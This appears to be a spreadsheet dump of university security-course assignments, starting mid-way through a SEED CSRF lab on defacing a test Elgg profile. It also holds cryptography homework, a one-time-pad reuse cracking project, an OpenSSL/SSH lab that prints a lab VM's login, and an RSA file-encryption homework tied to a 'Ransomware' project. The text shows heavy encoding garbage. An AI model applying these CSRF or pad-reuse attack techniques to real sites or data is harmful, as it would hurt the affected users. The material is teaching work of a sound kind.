parameters will Boby need to pass for such the CSRF attack to succeed? How must he pass them? 17. Edit the index.html file inside the attackerâ€™s website (www.csrflabattacker.com; /var/www/CSRF/attacker folder) so that the page will launch a CSRF attack to deface Aliceâ€™s profile to read â€œBoby and ${ Your_EUID} are MY HEROES!!â€. (Replace ${Your_EUID} with your actual EUID.) Hint: A sample code that you can modify is given in the original SEED lab. (The use of Javascript is allowed in this task. The sample code uses it.) NOTE: Create a backup copy of this version of the file because you will need to overwrite and then restore this file in later steps. Q13: Attach the contents of the attackerâ€™s index.html file. 18. Log in as Boby and send another message to Alice with the link to the attackerâ€™s webpage that you created above. Customization: The message MUST contain your EUID somewhere in the visible text. 19. Log in as Alice and click on â€œMy Profileâ€. Q14: Attach a screenshot of Aliceâ€™s profile at this point. 20. Click on the envelope to view the messages. Q15: Send a screenshot of the message with the link. Make sure it includes your EUID and a link to the www.csrflabattacker.com website. 21. Open the Web Console Network tab so that you can see the request, which you are about to make. 22. Then, click on the link in the message to launch the attackerâ€™s webpage. Q16: Attach a screenshot of the network traffic and a screenshot of the result. Describe what happened. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Q17: This attack requires Aliceâ€™s user ID in order to work. Describe how Boby can find out Aliceâ€™s user ID. Suppose that Boby now wants to modify the CSRF attack so that he can deface the Elgg profiles of any Elgg user that goes to Bobyâ€™s site. Q18: Can he do this? If so, how? If not, why not? Task 4: Implementing a Countermeasure for Elgg Enable the Countermeasure 23. Go to the /var/www/CSRF/Elgg/vendor/elgg/elgg/engine/classes/Elgg directory. In the â€œActionsService.phpâ€ file, find the â€œgatekeeperâ€ function. Comment out the â€œreturn true;â€ at the top of this function. Undo the Previous CSRF Attacks 24. Log in as Alice. 25. Click on the second-to-the-left icon (â€œFriendsâ€) on the top (black) bar. If Boby is here, click on Boby and click â€œRemove friendâ€. 26. Click on the leftmost icon (â€œProfileâ€) on the top (black) bar. Click on â€œEdit profileâ€ and undo the results of the CSRF attack on the profile. Repeat the CSRF Attacks Again 27. Restore the attackerâ€™s â€œindex.htmlâ€ file from Task 2. 28. Log in as Alice, go to the message from Boby with the link, and click on the link. 29. Then, go back to the www.csrflabelgg.com website. Q19: Describe what happens when you try to repeat the attack from Task 2. Why does this happen? Attach a screenshot if you can. 30. Restore the attackerâ€™s â€œindex.htmlâ€ file from Task 3. 31. Log in as Alice, go to the message from Boby with the link, and click on the link. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cross-Site Request Forgery (CSRF) Attack Lab Q20: Describe what happens when you try to repeat the attack from Task 3. Why does this happen? Provide a screenshot if you can."
INTRO TO COMPUTER SECURITY,3550,Cryptography 1,"Homework 6 Due: 11:59 PM on Monday, April 11, 2022 Form of submission: PDF, Word, or Text Document in Canvas â¦ Suppose a top-secret organization has 5,000 employees, all of whom need to communicate with every other employee in the organization. â¦ How many keys are needed if the organization used a symmetric key cryptosystem where two users use a single shared secret key to communicate with each other? â¦ How many keys are needed if the organization used an asymmetric, or public, key cryptosystem where each user has a public key and a private key? â¦ Calculate the timing of password-guessing attacks: (a) If passwords are three uppercase alphabetic characters long, how much time would it take to determine a particular password, assuming that testing an individual password requires 5 seconds? How much time if testing requires 0.001 seconds? (b) Argue for a particular amount of time as the starting point for â€œsecure.â€ That is, suppose an attacker plans to use a brute-force attack to determine a password. For what value of x (the total amount of time to try as many passwords as necessary) would the attacker find this attack prohibitively long? â¦ What are the risks of having the US government select a cryptosystem for widespread commercial use (both inside and outside the United States)? How could users from outside the United States overcome some or all of these risks? â¦ An affine cipher is a generalization of the Caesar cipher and has the following form: , where x is the plaintext letter and is the ciphertext letter. Now, assume that a ciphertext has been generated using an affine cipher where the first and second most frequent letter in the ciphertext are â€˜Bâ€™ and â€˜Uâ€™, respectively. Use the given information and what weâ€™ve covered in class to break this code! Hint: You are being asked to solve for a and b using a system of linear equations and there is some trial and error in these calculations! â¦ Consider a block cipher that has a block size of 4 bits, where each block can be written as a single hexadecimal digit. Now suppose an encryption function for a particular key is given in the following table: Decrypt the following messages that were encrypted using using the following modes of operation: â¦ ECB mode: c994f88 â¦ CBC mode with initialization vector = b: 144f â¦ Consider a language with only three letters, x, y, and z. Now suppose that you intercept a very long message in this language and discover the average frequencies for x, y, and z to be 0.6, 0.3, and 0.1, respectively. Based on your observations, what is the index of coincidence for this language? â¦ In DES, find the output (in hex) of the initial permutation box when the input is given in hexadecimal as: 0xFF00 0000 0000 0000 â¦ Decipher SFCXZY NSJFUW SMKEYY that was enciphered using the VigenÃ¨re method with the keyword SURE. â¦ Decrypt the following message that was encrypted using a rail-fence cipher: TSWILWLALPYIDVEAPIRDOARLTNIRTITOIEIIHIDSIHHWSDMRTEULOSTEMAHANH Note that you are not given the key (i.e., number of rows), so you will have to use some trial-and-error to decrypt this message, but start with at least 4 rows. â¦ Given the S-Box below, use the DES S-Box Rule that results in a 4-bit output for a given 6-bit input to compute . Be sure to give your answer in 4-bit binary representation. â¦ â¦"
INTRO TO COMPUTER SECURITY,3550,Cryptography 2,"CSCE 3550 Foundations of Cybersecurity Spring 2022 1 Project 2 Due: 11:59 PM on Monday, April 18, 2022 PROJECT BACKGROUND: In the lectures, we have said that we should never reuse a one-time pad to encrypt multiple messages. If the same one-time pad (i.e., key) is used more than once, you can apply some techniques to exploit the vulnerability and crack the ciphertext! Consider the following: ï¿½! = ï¿½!â¨ï¿½ ï¿½"" = ï¿½""â¨ï¿½ ï¿½!â¨ï¿½"" = ï¿½!â¨ï¿½â¨ï¿½""â¨ï¿½ = ï¿½!â¨ï¿½"" Since XOR is commutative, we eliminate ï¿½â¨ï¿½ = 0 and end up with an XOR of the two plaintexts. Since our plaintexts are made up of only letters (both upper- and lowercase) and spaces, we can build the following table of what happens when two characters are XORâ€™ed together using the ASCII encoding: â¨ A â€“ Z (65 â€“ 90) a â€“ z (97 â€“ 122) Space (32) A â€“ Z (65 â€“ 90) â‰¤ 32 â‰¤ 64 â‰¥ 65 a â€“ z (97 â€“ 122) â‰¤ 64 â‰¤ 32 â‰¥ 65 Space (32) â‰¥ 65 â‰¥ 65 0 If you look closely at this table, this means that when XORâ€™ing a space with any of the upper- or lowercase letters an ASCII value â‰¥ 65 is obtained. And that is the only case when this will happen! So, what does this mean and how can we use this? Letâ€™s see with an example. Suppose you have the following three plaintexts: 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ï¿½ï¿½ A t t a c k n o w ï¿½ï¿½ W i t h d r a w t o m o r r o w ï¿½ï¿½ C o m e t o d a y Suppose that you know they have been encrypted with the same one-time pad as ours has been. Then, we do not need to consider the key ï¿½ as we can make it vanish when used more than once. Take a look at the 7th column (under the 6 heading). What happens when we XOR ï¿½&[6] with ï¿½![6] and ï¿½""[6]? As expected, we get: ï¿½&[6]â¨ï¿½![6] = ï¿½&[6]â¨ï¿½![6] = 65 ï¿½&[6]â¨ï¿½""[6] = ï¿½&[6]â¨ï¿½""[6] = 79 CSCE 3550 Foundations of Cybersecurity Spring 2022 2 Now with some confidence, we can assert that ï¿½&[6] is a space since both values are â‰¥ 65, though more checks may need to be done to be sure. But now since ï¿½&[6]â¨ï¿½![6] is known, we can easily recover ï¿½![6] as well since having ï¿½&[6] and ï¿½&[6] means we have the key ï¿½[6] that can decrypt each letter in all the ciphertexts in this position. If we intercept enough ciphertexts that are encoded with the same one-time pad key, it is very likely that there will be enough spaces spread throughout all of the columns that will provide a fair amount of decryption. PROGRAM DESCRIPTION: For this project, you will write a program in any programming language supported on our Linux CSE machines that will decrypt as much of the ciphertexts as possible that are created using a many-time pad based on the technique to exploit the many-time pad vulnerability described above. This will involve reading in the file appropriately (i.e., using two hexadecimal values for each encrypted character) and then applying these techniques to decrypt the ciphertexts. These ciphertexts are generated using bitwise exclusive-or (XOR) with the one-time pad (actually, a many-time pad). For example, the ASCII value for the character 'H' is hexadecimal value 0x48 (or 01001000 in binary), which when XORâ€™ed with the hexadecimal one-time pad value 0xda (or 11011010 in binary) gives the hexadecimal ciphertext 0x92 (or 10010010 in binary). The resulting plaintexts are really just English sentences encoded in the standard ASCII character set. You may assume that you have three or more ciphertexts per many-time pad, each with 60 characters expressed using their hexadecimal ASCII values (i.e., 2 hexadecimal values or 8 bits). The one-time pad used to create each ciphertext is exactly the length of the plaintext message (in bytes, that is, 120 bytes). Also, the original plaintexts contain only upper- and lowercase alphabetic characters with spaces (i.e., no special characters or punctuation). To help you with testing, you will be provided with the two Python programs that were created to generate the ciphertexts used in the SAMPLE OUTPUT, but please note that your ciphertexts will be different each time you run these programs as they are uniquely and randomly created with each execution. You may use these programs also to create your own ciphertexts and test out various scenarios. Your goal will be to decrypt as much of the ciphertexts as possible, noting that the probability of being able to decrypt more of the ciphertexts increases with the number of plaintexts encrypted with the same one-time pad. For example, in the SAMPLE OUTPUT, only 37 of the 60 characters were able to be decrypted in the first set of ciphertexts because the one-time pad was re-used only four times (i.e., five messages) times while in the second set of ciphertexts, 51 of the 60 characters were able to be decrypted since the one-time pad was re-used ten times (i.e., eleven messages). This is because there were more spaces on the individual columns of the 60 characters in each ciphertext. You are only asked to decrypt 90% of the possible characters that can be decrypted of the 60-character set of ciphertexts using the ""space"" technique described above. This means, for example, that in the first given set of ciphertexts in the SAMPLE OUTPUT, you are only required to decrypt 33 characters on each line of the set of ciphertexts (since 37 columns of the first set of ciphertexts contain at least one space, and 37 * 0.9 = 33.3), but in the second set of ciphertexts, you are required to decrypt 45 characters on each line of the set of ciphertexts (since 51 columns of the second set of ciphertexts contain at least one space, and 51 * 0.9 = 45.9). However, decrypting more than the 90% of the possible characters using the ""space"" technique will earn an additional 0.5% for each additional percentage of the ciphertexts that are CSCE 3550 Foundations of Cybersecurity Spring 2022 3 decrypted, up to a total of 105% for this project, but incorrect decryptions will result in a reduction of marks. For each column you are unable to decrypt, you will simply insert a '_' character instead of the still encrypted character (which may be a control or unprintable character). REQUIREMENTS â€¢ Your code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and a brief description), comments for each variable, and commented â€œblocksâ€ of code. â€¢ Your program will be graded largely on whether it works correctly on the CSE machines (e.g., cse01, cse02, â€¦, cse06), so you should make sure that your program compiles and runs on a CSE machine. â€¢ Your program should work with any set of ciphertexts created using the given Python program, where you may assume a minimum of three plaintexts encrypted with the program, but may include more. â€¢ This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of ""F"" for the course, along with a report filed into the Academic Integrity Database. SAMPLE OUTPUT $ more plaintexts1 One time pad is really a completely unbreakable cryptosystem Encrypt and decrypt functions are each just an XOR operation Key needs to be random bitstring with same length as message A many time pad is very insecure and can be broken with ease If you can decipher this you can see just how insecure it is $ more ciphertexts1 43f591a7b0c5d04023d1e1ae2c584b79feee09caae701eba633d33c92542306e1c1a2e5cfaffa 6298ab85603a747d2e8a79d0d2ff2a3dab5a3bfda59 49f597f5bddcc90562cfe4ea68545b2bf5fb1c86a47c50b8373733ca260e34681c56321decf9e 4319aaa4942a44597908bbd5430f6a9dbada4a2d05a 47fe8da7aac9d8417081f4a52c535d79feea06c2ad641eb92a2a2fd027473b7d59013e08e7b1b 73a82bc1d0ea045d0bcaccf152ca6a1ccbfa3aad851 4dbb99e6aad59d516acce5ea7c505c79e5f848d0a77b47fb2a302fc1365b277f59173918aff2a 535cfbb5842a759d8a3a1815428efb8c1ecb5aacc51 45fdd4feabd99d4662cfa0ae69525129e4ee1a86b66157a8632733d1754d347459053219affbb 1289bf9550db20bdea6b78a172af4a989a5a4ebd647 $ ./a.out Enter the name of the ciphertexts file: ciphertexts1 Plaintext Messages: _ne __me pad __ __al__ a ___pl__el_ unb_eaka_le _ry_t_sy_t__ _ncr__t and d__r__t __nct___s __e _ach _ust _n X_R _p_ra_i__ _ey __eds to __ __nd__ bi___ri__ w_th s_me l_ngt_ a_ _es_a__ _ ma__ time p__ __ v__y i___cu__ a_d ca_ be _rok_n _i_h _a__ _f y__ can de__p__r __is ___ c__ s_e ju_t ho_ in_ec_r_ i_ __ $ more plaintexts2 It was the best of times it was the worst of times it was th e age of wisdom it was the age of foolishness it was the epo ch of belief it was the epoch of incredulity it was the seas on of Light it was the season of Darkness it was the spring of hope it was the winter of despair we had everything befor e us we had nothing before us we were all going direct to He aven we were all going direct the other way in short the per CSCE 3550 Foundations of Cybersecurity Spring 2022 4 iod was so far like the present period that some of its nois iest authorities insisted on its being received for good or for evil in the superlative degree of comparison only The op ening paragraph from A Tale Of Two Cities by Charles Dickens $ more ciphertexts2 ddbf8602f1f5d396cff2a6eba3f6576b17adc31fe4fb41a161684feffb88b0175c7ca13d6dc6c 3ec9f96e90b4605e93d4b4e74fab141a047b997b0b4 f1ebc712f5a69c8487e0effaa2ea4e6b11bfc31cece504a629641baeeb8ce3584e34a27275c5d 8ec83d8e31e1551e9240e4a35e0e515bf43ead2b4b3 f7a3861af6a69187cbfee3efe6ec576b0faa904bf9fe41f2247154ace4c9ac51087daa7e68ccd 5ea87dff2144618f470595c27b3b109b206b9d2a5af fba5861af6a6bf8bc0fff2a9aff1033c19b8c31fe5f304a1246048a0e2c9ac510850a56f71c7d 4ec9896ef194606e1230e493cf6e512a754a3d9a3fc fbad861dfff696c2cee3a6fea7f6033f10aec31ce4f850b7332154a9ac8da6445875ad6f3aded 4bf83d7e24d0307e52257493cfaab06f744afd1abae f1ebd306b0f196c2cff6e2a9a8ea572311a5844beff342bd33641bbaffc9b4520863a16f7f89d 0f38796e1020f1fe7704a5426f6a615f752a5978cb9 f5bdc31bb0f196c2d0f2f4ece6e44f2758ac8c02e3f104b628735eacf8c9b75f4d34ab6972ccc 3bf9cd7ff4d0f1fa023465226e7e515bf43eac7a1ae fda4c255e7e780c2d4f8a6efa7f7032711a0864bf9fe41f231735ebce987b7175871b67475cd9 1eb83d7f24d151eed350e5232b3ac15a406a4d8adaf fdaed501b0e78696cff8f4e0b2ec463858a28d18e4e550b7252154a1ac80b7440876a17474ce9 1ed8ed5e3041014e470485226b3a20eb842ead8b6fc f2a4d455f5f09a8e87fee8a9b2ed466b0bbe930efffa45a628775eefe88ca4454d71e4727c89d 2f086c6e71f0f02ef3e0e523affbc41834eaf97abac f1a5cf1bf7a68383d5f6e1fba7f54b6b1eb98c06add70486206d5eefc38fe3635f7be45e73ddd 8fa9896e4144632e8315c5131e0e525be45a1d2aaaf $ ./a.out Enter the name of the ciphertexts file: ciphertexts2 Plaintext Messages: _t was th_ be_t o_ ti_es it was the wors_ _f time_ it was _h _ age of _isd_m i_ wa_ the age of foolis_n_ss it _as the e_o _h of bel_ef _t w_s t_e epoch of incredu_i_y it w_s the se_s _n of Lig_t i_ wa_ th_ season of Darknes_ _t was _he sprin_ _f hope i_ wa_ th_ wi_ter of despair we _a_ every_hing bef_r _ us we h_d n_thi_g b_fore us we were al_ _oing d_rect to _e _ven we w_re _ll _oin_ direct the other _a_ in sh_rt the p_r _od was s_ fa_ li_e t_e present period t_a_ some _f its no_s _est auth_rit_es _nsi_ted on its being r_c_ived f_r good o_ _or evil _n t_e s_per_ative degree of co_p_rison _nly The _p _ning par_gra_h f_om _ Tale Of Two Citie_ _y Char_es Dicke_s SUBMISSION â€¢ You will electronically submit all of your source code files, makefile, if applicable, plus a README file with any important compiling/running instructions for the TA to the Project 2 dropbox in Canvas by the due date. â€¢ Note that the dates on your electronic submission will be used to verify that you met the due date above. Projects submitted late up to 1 day (i.e., 24 hours) will receive a 30% grade penalty. Later submissions will receive zero credit, so hand in your best effort on the due date. â€¢ The work submitted for this project must be your own work and done individually. Evidence to the contrary will receive a â€œ0â€ for this project and may result in further disciplinary action. â€¢ If you have any questions or concerns about what is expected in this project, please contact your instructor."
INTRO TO COMPUTER SECURITY,3550,Cryptography 3,"Lab 5a: Cryptography This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. The credentials are as follows: username: sec-lab password: untccdc Section 1: Symmetric Encryption using OpenSSL The learning objective of this lab is for students to get familiar with the concepts in the secret key encryption. After finishing the lab, students should be able to gain a first-hand experience on encryption algorithms and their modes of operation. We will study tools and libraries for providing data confidentiality. OpenSSL (https://www.openssl.org/) is toolkit for the Transport Layer Security (TLS) protocol, and also a general-purpose cryptographic library. Its latest full-featured version OpenSSL 1.1.1 is installed on the VM. Encryption and decryption is performed using â€œopenssl encâ€ and â€œopenssl decâ€ commands, respectively. You may type â€œman opensslâ€ to learn more. In your home directory, create a text file plaintext.txt and write a sentence â€œThis is my secret messageâ€ into it (make sure to close the file). To confirm, type: cat plaintext.txt Q1: Attach a screenshot of the result. Let us now encrypt this file using a password. Type: openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.bin The first option requests to use the AES-256 cipher in the counter (CTR) mode. The second option defined a password to be used for encryption, and the next option requests to use the PBKDF2 algorithm for generating a key from the password. In this exercise, for simplicity, use your EUID as a password (for example, if your EUID is â€œaa0001â€, then the respective option will be written as â€œ-pass pass:aa0001â€). Note that in practice, such a password should never be used as it is very weak (i.e., too short and too easy to guess). The remaining options define the filenames for input (theÂ plaintext) and output (theÂ ciphertext). Note: If the â€œ-passâ€ option was not used, then utility would request the password to be entered manually (two times â€“ the second one for confirmation). Display the contents of the ciphertext file: hexdump -C ciphertext.bin Q2: Attach a screenshot of the result. For decryption: openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -d -in ciphertext.bin -out plaintext_dec.txt Note: If the â€œ-passâ€ option was not used, then utility would request the password to be entered manually. To confirm, type: cat plaintext_dec.txt Note that the original messages have been decrypted. Q3: Attach a screenshot of the result. It is possible to encode the ciphertext using Base 64, in order to have it in the text format: openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.txt Type: cat ciphertext.txt Verify that decryption works correctly: openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext.txt Note: If the option â€œ-outâ€ is omitted, the standard output is used. Q4: Attach a screenshot of the result. Run the encryption again with the same password, but write the output into ciphertext2.txt: openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext2.txt Note that the decryption works correctly again: openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext2.txt Now, note that the ciphertexts are different. To verify, type: cmp ciphertext.txt ciphertext2.txt cat ciphertext.txt ciphertext2.txt Q5: Explain why the ciphertexts in ciphertext.txt and ciphertext2.txt are different, even though theÂ same password was used for encryption. Hint: Run decryption of both files again, no adding the â€œ-pâ€ option. Section 2: Public Key Encryption and Digital Signatures Using OpenSSL Let us focus on the RSA algorithm in this section. First, let us generate an RSA private key (effectively, we will generate the public/private key pair). Type: openssl genrsa -out euid.key 3072 As usual, replace â€œeuidâ€ with your actual EUID. This command generates the RSA private key and outputs it to the file euid.key. The key is stored in the PEM format. Display it: cat euid.key Next, we extract and display the public key: openssl rsa -in euid.key -pubout -out euid_pk.key cat euid_pk.key Q6: Attach a screenshot of the result. For encrypting the plaintext.txt, type: openssl rsautl -encrypt -pubin -inkey euid_pk.key -in plaintext.txt -out rsa_ciphertext.bin For decryption, type: openssl rsautl -decrypt -inkey euid.key -in rsa_ciphertext.bin -out rsa_plaintext_dec.txt cat rsa_plaintext_dec.txt Q7: Attach a screenshot of the result. Note: The above method is suitable for encryption of short messages (up to about 1 kilobyte), for longer messages a hybrid encryption (KEM/DEM) should be used. To digitally sign the file plaintext.txt, type: openssl dgst -sign euid.key -out sig.bin plaintext.txt Note: As of the current version 1.1.1, OpenSSL signs messages directly when using the rsautl or pkeyutl commands. For this reason, it is simpler to deploy the dgst command, in order to hash and sign the message with one command. Display the signature: hexdump sig.bin To verify the signature: openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt Q8: Attach a screenshot of the result. Any changes in the message will invalidate the signature. Let us replace the last letter in our message: echo ""This is my secret messagd"" > plaintext.txt cat plaintext.txt Now, verification will fail: openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt Q9: Attach a screenshot of the result. Section 3: Public Key Certificates Using OpenSSL Let us now study handling of X.509 public key certificates using OpenSSL. Suppose that we would like to create a certificate signing request (CSR) to the Certificate Authority for the RSA key that we generated earlier. The following command can be used (do not type it yet): openssl req -key euid.key -new -out euid_domain.csr Then, the utility will request some additional information, which is called a Distinguished Name (DN). An important field in the DN is the Common Name (CN) â€”it should be the exact domain name of the host for which the certificate will be used. Below is an example of the prompt: Country Name (2 letter code): The two-letter country code where your company/organization is legally located. Example: US State or Province Name (full name): Example: Texas Locality Name (e.g., city): Example: Denton Organization Name (e.g., company): University of North Texas Organizational Unit Name (e.g., section): Department of Computer Science and Engineering (this field is optional) Common Name (e.g. server FQDN): Fully Qualified Domain Name; Example: www.unt.edu Email Address: Example: webmaster@unt.edu (this field is optional) It is possible to enter all of the above information from the command line as described below. Type: openssl req -key euid.key -new -out euid_domain.csr \ -subj ""/C=US/ST=Texas/L=Denton/O=UNT/OU=CSE/CN=www.euid.edu"" Let us verify the result: openssl req -text -in euid_domain.csr -noout -verify Q10: Attach a screenshot of the result. Note: The CSR file â€œeuid_domain.csrâ€ will need to be sent to CA that will check the user information. If the check is successful, CA will issue the certificate file. We will omit this step in this lab. Instead, we will obtain and verify the certificate of the Google webserver. For that, we will use the s_client program (of the OpenSSL suite) which implements a generic SSL/TLS client. Type: openssl s_client -connect google.com:443 </dev/null Note: The redirection from the null device immediately closes the s_client program, as in general it expects commands to establish the TLS connection. In order to display the whole certificate chain, type: openssl s_client -connect google.com:443 -showcerts </dev/null Since the output of the previous command takes several screens to be display, making a picture of the last screen may not be very informative. The â€œmoreâ€ command will be helpful in this case. Type: openssl s_client -connect google.com:443 -showcerts </dev/null | more Note: Scrolling is done by pressing â€œSpaceâ€ to advance the whole screen down, or â€œEnterâ€ to advance one line. Q11: Attach two screenshots: The first and the last screen displayed as a result of the above command. Section 4: SSH Authentication Using Public Keys OpenSSH can use public key cryptography for authentication. We will use a freshly generated RSA key pair. Note that if you already have a generated key, you may use the ssh-keygen command with â€œ-iâ€ option and then specify the key file name. Important note: In this lab, we will use the earlier generated key pair, only to demonstrate the conversion of key formats. Type: ssh-keygen -t rsa Note: You will see the following promptsâ€”you may just press â€œEnterâ€ for all of themâ€”and the following messages will be displayed: Enter file in which to save the key (/home/sec-lab/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/sec-lab/.ssh/id_rsa Your public key has been saved in /home/sec-lab/.ssh/id_rsa.pub The key fingerprint is: SHA256:lsfwRd7HQmfPZ+rjQOGjLkyr+M67/xImKZRtVD31T9s sec-lab@vm1 (Note: The above value and the below randomart image will be different each time for each student. The â€œrandomartâ€ image is a visualization of the SHA256 hash value to make it easier to compare.) The key's randomart image is: +---[RSA 3072]----+ | ... .o . o| | . oo + =.| | + . .+ + O| | o o = o . B+| | . . .S + + ..E| | . o.+. o o | | . = o. . o | | o =. o . | | .oB=.+o . | +----[SHA256]-----+ Q12: Attach a screenshot of the result. Let us verify the result: ls ~/.ssh/ You may expect to see two files: id_rsa and id_rsa.pub, which should contain the private and public keys, respectively. Let us try to establish an SSH connection (for simplicity, we will connect to our own host): ssh localhost The SSH server will request a password. Press â€œControl+Zâ€ to escape. Suppose that we want to allow trusted users to access our host without entering a password. Such a user needs to possess a private key corresponding to the public key communicated to the server in a trusted manner. Such the public key are called â€œauthorized keysâ€. Designate your public key as the OpenSSH authorized key as follows: cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys This should allow us to establish an SSH connection (to our own host) without the use of passwords: ssh localhost (if the prompt about adding to the known hosts appears, then accept it) (If successful, a welcome message will be displayed.) Close the SSH connection: exit Q13: Attach a screenshot of the result. References: OpenSSL version 1.1.1 manual: https://www.openssl.org/docs/man1.1.1/ OpenSSL Cookbook, 3ed online: https://www.feistyduck.com/library/openssl-cookbook/online/ OpenSSL Quick Reference Guide: https://www.digicert.com/kb/ssl-support/openssl-quick-reference-guide.htm M. Anicas: OpenSSL Essentials: Working with SSL Certificates, Private Keys and CSRs: https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs Wikibook on OpenSSH/Cookbook/Public Key Authentication: https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Public_Key_Authentication"
INTRO TO COMPUTER SECURITY,5550,Cryptography 4,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 3: Cryptography Homework 3: Cryptography Due on Nov 13 at 11:59pm Grading Rubric: Q0 is worth 5 points. Q1-Q7 are worth 15 points each. Total: 110 points (the actual grade will not exceed 100 points). Submission Guide: You must submit the homework assignment (in PDF) and all the created code and executables. For this homework, use the same virtual machine (VM) as for your project. IMPORTANT NOTE: Before starting this assignment, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction In this homework, you will write programs which perform public-key encryption and compute cryptographic checksums (keyless and keyed). You may use any programming language in this assignment. We recommend you choose the same one as for the project â€œRansomwareâ€. Some of the components created in this homework may be re-purposed for your project. Section 1: Public-key encryption 1. Create a directory â€œhw3â€. Download a file â€œsensitive.txtâ€ from the assignment page and copy it into the directory â€œhw3â€. 2. Write a program â€œgenerate_keysâ€. This program will randomly generate a pair of 3072-bit RSA keys and then it will save the public key into a file â€œpub_keyâ€ and the private key into a file â€œpriv_keyâ€. Q0: What programming language did you use? What cryptographic library did you use? Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 3: Cryptography In the terminal window, run the program â€œgenerate_keysâ€. Then, display the files â€œpub_keyâ€ and â€œpriv_keyâ€ using the â€œhexdumpâ€ command. Q1: Attach a screenshot of the result. 3. Write a program â€œencrypt_fileâ€. This program will encrypt a file â€œsensitive.txtâ€ in the directory â€œhw3â€ on the key â€œpub_keyâ€. The key will be read from the file â€œpub_keyâ€. The encrypted file will overwrite the original file â€œsensitive.txtâ€. Make sure that the original (unencrypted) file â€œsensitive.txtâ€ is placed into the directory â€œhw3â€. In the terminal window, display the first 100 bytes of the original (unencrypted) file â€œsensitive.txtâ€ using the â€œheadâ€ command. Run the program â€œencrypt_fileâ€. Display the first 100 bytes of the encrypted file â€œsensitive.txtâ€ using the â€œhexdumpâ€ command. Q2: Attach a screenshot(s) of the result. Make sure that both original (unencrypted) and encrypted versions of the file are displayed on the screenshots. 4. Write a program â€œdecrypt_fileâ€. This program will decrypt the file â€œsensitive.txtâ€ in the directory â€œhw3â€ using the key â€œpriv_keyâ€. The key will be read from the file â€œpriv_keyâ€. The decrypted file will overwrite the encrypted file â€œsensitive.txtâ€. Make sure that the encrypted file â€œsensitive.txtâ€ is in the directory â€œhw3â€. In the terminal window, display the first 100 bytes of the encrypted file â€œsensitive.txtâ€ using the â€œhexdumpâ€ command. Run the program â€œdecrypt_fileâ€. Display the first 100 bytes of the decrypted file â€œsensitive.txtâ€ using the â€œheadâ€ command. Q3: Attach a screenshot(s) of the result. Make sure that both encrypted and decrypted versions of the file are displayed on the screenshots. 5. Write a program â€œcompute_checksumâ€ which computes a keyless cryptographic checksum of a file â€œsensitive.txtâ€. You will use a hash function SHA256 compute it. The checksum will be written into a file â€œsensitive_checksum.txtâ€â€”this file should be in the text format. Copy the original (unencrypted) file â€œsensitive.txtâ€ into the directory â€œhw3â€. In the terminal window, run the program â€œcompute_checksumâ€. Display the checksum: cat sensitive_checksum.txt Q4: Attach a screenshot of the result. Student Name: Course: CSCE 5550 Semester: Fall 2022 Homework 3: Cryptography 6. Write a program â€œverify_checksumâ€ which works as follows: it computes a checksum of â€œsensitive.txtâ€ and compares it with the contents of â€œsensitive_checksum.txtâ€. If the resulting hash values are the same, then the program outputs â€œAccept!â€ and otherwise it outputs â€œReject!â€. In the terminal window, run the program â€œverify_checksumâ€. (Observe the result.) Change the first symbol in â€œsensitive.txtâ€ to a different symbol, and save the file. Come back to the terminal window and run the program â€œverify_checksumâ€. (Observe the result.) Q5: Attach a screenshot of the result. 7. Write a program â€œcompute_keyed_checksumâ€ which works similarly to the one in Step 4, but instead of SHA256, you will use the keyed hash function HMAC-SHA256. A 256-bit key will be read from the file â€œkey.binâ€. The checksum will be written into a file â€œsensitive_keyed_checksum.txtâ€â€”this file should be in the text format. Generate a random key: head -c 256 /dev/urandom > key.bin Copy the original (unencrypted) file â€œsensitive.txtâ€ into the directory â€œhw3â€. In the terminal window, run the program â€œcompute_keyed_checksumâ€. Display the checksum: cat sensitive_keyed_checksum.txt Q6: Attach a screenshot of the result. 8. Write a program â€œverify_keyed_checksumâ€ which works as follows: it computes a keyed checksum of â€œsensitive.txtâ€ using HMAC-SHA256 and compares it with the contents of â€œsensitive_keyed_checksum.txtâ€. If the resulting values are the same, then the program outputs â€œAccept!â€ and otherwise it outputs â€œReject!â€. In the terminal window, run the program â€œverify_keyed_checksumâ€. (Observe the result.) Change the first symbol in â€œsensitive.txtâ€ to a different symbol, and save the file. Come back to the terminal window and run the program â€œverify_checksumâ€. (Observe the result.) Q7: Attach a screenshot of the result."
